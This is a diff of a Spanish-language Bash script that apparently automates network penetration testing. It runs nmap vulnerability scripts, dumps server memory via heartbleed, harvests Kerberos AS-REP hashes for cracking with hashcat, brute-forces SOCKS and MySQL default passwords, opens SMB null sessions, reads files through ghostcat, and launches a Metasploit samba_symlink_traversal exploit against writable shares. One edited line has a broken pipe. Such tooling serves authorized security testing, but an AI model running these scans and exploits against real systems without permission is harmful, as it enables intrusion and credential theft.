@@ -110,14 +110,14 @@ function enumeracionIIS () {
         echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
         echo "nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 
         nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 					
-        grep "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 					
+        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 					
     
     fi
 
     echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
     echo "nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
     nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
-    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
+    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
 
     echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"						
     web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_iis_admin.txt
@@ -220,7 +220,7 @@ function enumeracionApache () {
 		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
 		echo "nmap --script http-slowloris-check -p $port $host" > logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
 		nmap -Pn --script http-slowloris-check -p $port $host >> logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
+		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
 	fi
 
 	if [ $internet == "n" ]; then 
@@ -244,9 +244,9 @@ function enumeracionApache () {
 	fi
 	
 
-	echo -e "\t\t[+] Revisando docker socks ($host - Apache/nginx)"
-	curl -XGET --unix-socket /var/run/docker.sock $proto://$host:$port/images/json > logs/vulnerabilidades/"$host"_docker_images.txt
-	grep "Containers" logs/vulnerabilidades/"$host"_docker_images.txt > .vulnerabilidades/"$host"_docker_images.txt
+	#echo -e "\t\t[+] Revisando docker socks ($host - Apache/nginx)"
+	#curl -XGET --unix-socket /var/run/docker.sock $proto://$host:$port/images/json > logs/vulnerabilidades/"$host"_docker_images.txt
+	#grep "Containers" logs/vulnerabilidades/"$host"_docker_images.txt > .vulnerabilidades/"$host"_docker_images.txt
 }
 
 
@@ -288,7 +288,7 @@ function enumeracionCMS () {
 
     echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
     nmap -n -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
-    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt | grep -v ERROR > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
+    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
     sleep 1
 
     #######  drupal (domain) ######
@@ -451,7 +451,7 @@ function testSSL ()
     greprc=$?
     if [[ $greprc -eq 0 ]] ; then						
         echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
-        grep "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
+        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
         heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt
         heartbleed.sh $host $port &
     else							
@@ -1080,10 +1080,13 @@ cat .escaneo_puertos/tcp-especificos.txt  .escaneo_puertos/tcp-ports.txt | sort 
 
 echo -e "#################### Escaneo de puertos UDP ######################"	  
 nmap -Pn -n -sU -p 53,69,123,161,500,5353,1900,11211,1604,623,47808 --open -iL $live_hosts -oG .escaneo_puertos/nmap-udp.grep 
-egrep -v "^#|Status: Up" .escaneo_puertos/nmap-udp.grep | cut -d' ' -f2,4- |  awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g' >> .escaneo_puertos/udp.txt
+nmap-grep.sh .escaneo_puertos/nmap-udp.grep  >> .escaneo_puertos/udp2.txt
+#egrep -v "^#|Status: Up" .escaneo_puertos/nmap-udp.grep | cut -d' ' -f2,4- |  awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g' >> .escaneo_puertos/udp.txt
 
 nmap -T2 -Pn -n -sU -p 53,69,123,161,500,5353,1900,11211,1604,623,47808 --open -iL $live_hosts -oG .escaneo_puertos/nmap-udp.grep 
-egrep -v "^#|Status: Up" .escaneo_puertos/nmap-udp.grep | cut -d' ' -f2,4- |  awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g' >> .escaneo_puertos/udp.txt
+nmap-grep.sh .escaneo_puertos/nmap-udp.grep  >> .escaneo_puertos/udp2.txt
+
+sort .escaneo_puertos/udp2.txt | uniq > .escaneo_puertos/udp.txt
 
 #udp-hunter.sh --file=`pwd`/"$live_hosts" --output=`pwd`"/.escaneo_puertos/udp.txt" --timeout=10 --noise=true
 #sleep 10
@@ -1449,7 +1452,8 @@ then
 
 		if [ ! -z "$dominioAD" ]
 		then
-			GetNPUsers.py "$dominioAD"/ -no-pass -usersfile $common_user_list -format hashcat -dc-ip $ip > logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
+			echo "dominioAD $dominioAD" | tee -a  logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
+			GetNPUsers.py "$dominioAD"/ -no-pass -usersfile $common_user_list -format hashcat -dc-ip $ip >> logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
 			grep "krb5as" logs/vulnerabilidades/"$ip"_"$port"_kerberosHash.txt > .vulnerabilidades/"$ip"_"$port"_kerberosHash.txt
 			# hashcat -m 18200 -a 0 hash.txt /media/sistemas/Passwords/Passwords/rockyou2021.txt -o cracked.txt #hash.txt tiene todos los datos no solo hash
 		fi				
@@ -1538,7 +1542,7 @@ if [ -f servicios/iscsi.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		
 		nmap -n -Pn --script=iscsi-info -p $port $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"$port"_info.txt > .enumeracion/"$ip"_"$port"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_"$port"_info.txt 
 
 		iscsiadm -m discovery -t sendtargets -p $ip:$port > logs/enumeracion/"$ip"_"$port"_discovery.txt 
 		#iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --login
@@ -1582,7 +1586,7 @@ if [ -f servicios/distccd.txt ]
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		nmap -n -Pn --script=distcc-exec -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_rce.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_rce.txt > .vulnerabilidades/"$ip"_"$port"_rce.txt 				
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rce.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_rce.txt 				
 		
 	done
 
@@ -1623,7 +1627,7 @@ if [ -f servicios/erlang.txt ]
 		port=`echo $line | cut -f2 -d":"`
 
 		nmap -sV -Pn -n -T4 -p $port --script epmd-info $ip >> logs/enumeracion/"$ip"_"erlang"_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"erlang"_info.txt > .enumeracion/"$ip"_"erlangt"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"erlang"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_"erlangt"_info.txt 
 		
 		#erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
 		#os:cmd("id").
@@ -1658,7 +1662,7 @@ if [ -f servicios/mDNS.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "nmap -Pn -sUC -n  -p $port $ip" > logs/enumeracion/"$ip"_"mDNS"_info.txt 2>/dev/null
 		nmap -Pn -sUC -n  -p $port $ip >> logs/enumeracion/"$ip"_"mDNS"_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"mDNS"_info.txt | grep -v zeroconf> .enumeracion/"$ip"_"mDNS"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"mDNS"_info.txt |  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|zeroconf" > .enumeracion/"$ip"_"mDNS"_info.txt 
 	
 		echo "pholus3.py eth0 -rq -stimeout 10" > logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
 		pholus3.py eth0 -rq -stimeout 10 | tee -a logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
@@ -1695,7 +1699,7 @@ if [ -f servicios/RabbitMQ.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "nmap -Pn -n --script=amqp-info -p $port $ip" > logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
 		nmap -Pn -n --script=amqp-info -p $port $ip >> logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"RabbitMQ"_info.txt > .enumeracion/"$ip"_"RabbitMQ"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"RabbitMQ"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_"RabbitMQ"_info.txt 
 
 	done
 
@@ -1712,7 +1716,7 @@ if [ -f servicios/cassandra.txt ]
 
 		echo "nmap -Pn -n --script=cassandra-info  -p $port $ip" > logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
 		nmap -Pn -n --script=cassandra-info  -p $port $ip >> logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_cassandra_info.txt > .enumeracion/"$ip"_cassandra_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_cassandra_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_cassandra_info.txt 
 
 		# cqlsh <IP>
 		# #Basic info enumeration
@@ -1742,7 +1746,7 @@ if [ -f servicios/NDMP.txt ]
 
 		echo "nmap -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip" > logs/enumeracion/"$ip"_NDMP_info.txt 2>/dev/null
 		nmap -n -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip >> logs/vulnerabilidades/"$ip"_NDMP_info.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_NDMP_info.txt > .vulnerabilidades/"$ip"_NDMP_info.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_NDMP_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .vulnerabilidades/"$ip"_NDMP_info.txt 
 		
 	done
 
@@ -1758,7 +1762,7 @@ if [ -f servicios/ajp13.txt ]
 
 		echo "nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip" > logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
 		nmap -n -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_ajp13_proxyAuth.txt > .enumeracion/"$ip"_ajp13_proxyAuth.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_ajp13_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_ajp13_proxyAuth.txt 
 		
 		ghostcat.py -p $port -f /WEB-INF/web.xml $ip | strings > logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt 
 		egrep -iq "web-app" logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt
@@ -1842,7 +1846,7 @@ if [ -f servicios/EtherNet.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "nmap -n -Pn --script=enip-info -p $port $ip" > logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
 		nmap -n -Pn --script=enip-info -p $port $ip >> logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_EtherNet_info.txt > .vulnerabilidades/"$ip"_EtherNet_info.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_EtherNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .vulnerabilidades/"$ip"_EtherNet_info.txt
 
 		python3 -m cpppo.server.enip.list_services --list-identity -a $ip > logs/vulnerabilidades/"$ip"_EtherNet_services.txt
 	done
@@ -1859,7 +1863,7 @@ fi
 # 		port=`echo $line | cut -f2 -d":"`
 # 		echo "nmap -Pn --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip" > logs/enumeracion/"$ip"_BACNet_info.txt
 # 		nmap -Pn --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip >> logs/enumeracion/"$ip"_BACNet_info.txt
-# 		grep "|" logs/enumeracion/"$ip"_BACNet_info.txt | grep -v filtered > .enumeracion/"$ip"_BACNet_info.txt
+# 		grep --color=never "|" logs/enumeracion/"$ip"_BACNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .enumeracion/"$ip"_BACNet_info.txt
 
 # 	done
 
@@ -1874,7 +1878,7 @@ if [ -f servicios/hadoop-jobtracker.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_jobtracker.txt
 		nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_jobtracker.txt
-		grep "|" logs/enumeracion/"$ip"_hadoop_jobtracker.txt > .enumeracion/"$ip"_hadoop_jobtracker.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_jobtracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_hadoop_jobtracker.txt		
 	done
 
 	insert_data
@@ -1890,7 +1894,7 @@ if [ -f servicios/hadoop-namenode.txt ]
 		
  		echo "nmap -n -Pn --script hadoop-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_namenode.txt
 		nmap -n -Pn --script hadoop-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_namenode.txt
-		grep "|" logs/enumeracion/"$ip"_hadoop_namenode.txt > .enumeracion/"$ip"_hadoop_namenode.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_namenode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_hadoop_namenode.txt		
 	done
 
 	insert_data
@@ -1905,7 +1909,7 @@ if [ -f servicios/hadoop-datanode.txt ]
 		
  		echo "nmap -n -Pn --script hadoop-datanode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_datanode.txt
 		nmap -n -Pn --script hadoop-datanode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_datanode.txt
-		grep "|" logs/enumeracion/"$ip"_hadoop_datanode.txt > .enumeracion/"$ip"_hadoop_datanode.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_datanode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_hadoop_datanode.txt		
 	done
 	insert_data
 fi
@@ -1920,7 +1924,7 @@ if [ -f servicios/hadoop-secondary.txt ]
 		
  		echo "nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_secondary.txt
 		nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_secondary.txt
-		grep "|" logs/enumeracion/"$ip"_hadoop_secondary.txt > .enumeracion/"$ip"_hadoop_secondary.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_secondary.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_hadoop_secondary.txt		
 	done
 	insert_data
 fi
@@ -1936,7 +1940,7 @@ if [ -f servicios/hadoop-tasktracker.txt ]
 		
  		echo "nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_tasktracker.txt
 		nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_tasktracker.txt
-		grep "|" logs/enumeracion/"$ip"_hadoop_tasktracker.txt > .enumeracion/"$ip"_hadoop_tasktracker.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_tasktracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .enumeracion/"$ip"_hadoop_tasktracker.txt		
 	done
 	insert_data
 fi
@@ -2023,11 +2027,11 @@ if [ -f servicios/proxy.txt ]
 
 		echo "nmap -Pn --script=socks-auth-info -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
 		nmap -n -Pn --script=socks-auth-info -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt > .vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"> .vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 
 
 		echo "nmap -Pn --script=socks-brute -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
 		nmap -n -Pn --script=socks-brute -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt > .vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 
 
 		# echo socks5 10.10.10.10 1080 username password > nano /etc/proxychains4.conf
 
@@ -2043,9 +2047,23 @@ if [ -f servicios/mysql.txt ]
 	for line in $(cat servicios/mysql.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
-		echo "nmap -Pn  --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip" > logs/vulnerabilidades/"$ip"_"$mysql"_mysqlVuln.txt 2>/dev/null
-		nmap -n -Pn --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_"$mysql"_mysqlVuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_mysqlVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$mysql"_mysqlVuln.txt
+		echo "nmap -Pn  --script=mysql-enum -p $port $ip" > logs/vulnerabilidades/"$ip"_mysql_enum.txt 2>/dev/null
+		nmap -n -Pn --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_mysql_enum.txt 2>/dev/null		
+
+		egrep -iq "No valid accounts found" logs/vulnerabilidades/"$ip"_mysql_enum.txt 2>/dev/null
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t No valid accounts found \n"					
+		else
+			grep --color=never "|" logs/vulnerabilidades/"$ip"_mysql_enum.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|not allowed" > .vulnerabilidades/"$ip"_mysql_enum.txt
+		fi	
+
+
+		
+
+		echo "nmap -Pn  --script=mysql-vuln-cve2012-2122 -p $port $ip" > logs/vulnerabilidades/"$ip"_mysql_vuln.txt 2>/dev/null
+		nmap -n -Pn --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_mysql_vuln.txt 2>/dev/null
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_mysql_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|not allowed" > .vulnerabilidades/"$ip"_mysql_vuln.txt
 
 		echo "medusa -e n -u root -p root -h $ip -M mysql" >  logs/cracking/"$ip"_mysql_defaultPassword.txt
 		medusa -e n -u root -p root -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
@@ -2075,7 +2093,7 @@ then
 	interlace -tL servicios/smb_uniq.txt -threads 5 -c "nmap -n -sT -Pn --script smb-os-discovery.nse -p445 _target_ | grep '|'> .smbinfo/_target_.txt" --silent	
 
 	#null session
-	interlace -tL servicios/smb_uniq.txt -threads 5 -c "rpcclient -U "" -N -c srvinfo _target_ >  logs/vulnerabilidades/_target__445_nullsession.txt " --silent	
+	interlace -tL servicios/smb_uniq.txt -threads 5 -c "rpcclient -U "" -N -c srvinfo _target_ >  logs/vulnerabilidades/_target__445_nullsession.txt" --silent	
 
 	# rpcclient>srvinfo
 	# rpcclient>enumdomusers
@@ -2172,27 +2190,28 @@ then
 		getArch.py -target $ip > logs/enumeracion/"$ip"_445_arch.txt
 		grep --color=never "is" logs/enumeracion/"$ip"_445_arch.txt > .enumeracion/"$ip"_445_arch.txt
 															
-		grep "|" logs/vulnerabilidades/"$ip"_445_ms08067.txt| egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms08067.txt 					
-		grep "|" logs/vulnerabilidades/"$ip"_445_ms17010.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms17010.txt  			
-		grep "|" logs/vulnerabilidades/"$ip"_445_doublepulsar.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_doublepulsar.txt  			
-		grep "|" logs/vulnerabilidades/"$ip"_445_conficker.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_conficker.txt 
-		grep "|" logs/vulnerabilidades/"$ip"_445_ms10061.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms10061.txt 
-		grep "|" logs/vulnerabilidades/"$ip"_445_ms07029.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms07029.txt 
-		grep "|" logs/vulnerabilidades/"$ip"_445_ms06025.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms06025.txt 
-		grep "|" logs/vulnerabilidades/"$ip"_445_sambacry.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_sambacry.txt 
-		grep "|" logs/vulnerabilidades/"$ip"_445_ms09050.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms09050.txt
-		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt | egrep -iv "Enter WORKGROUP|password for|Unknown parameter" > .vulnerabilidades/"$ip"_445_nullsession.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms08067.txt| egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms08067.txt 					
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms17010.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms17010.txt  			
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_doublepulsar.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_doublepulsar.txt  			
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_conficker.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_conficker.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms10061.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms10061.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms07029.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms07029.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms06025.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms06025.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambacry.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_sambacry.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms09050.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms09050.txt
+		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt | egrep -iv "Enter WORKGROUP|password for|Unknown parameter" > .vulnerabilidades/"$ip"_445_nullsession.txt 2>/dev/null
+		         
 		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
 		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
 		egrep --color=never "Disk" logs/vulnerabilidades/"$ip"_445_compartidoSMBClient.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMBClient.txt		
 
 
-		writable_shared=`egrep --color=never "WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | cut -d " " -f1-2 |tr -d '\t'` 
+		writable_shared=`egrep --color=never "WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | cut -d " " -f1-2 | head -1|tr -d '\t'` 
 
 		if [ ! -z "$writable_shared" ]; then
-			echo "Probando samba_symlink_traversal con $writable_shared"
-			msfconsole -x "use admin/smb/samba_symlink_traversal;set SMBSHARE '$writable_shared';set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_symlinkTraversal.txt 2>/dev/null							   
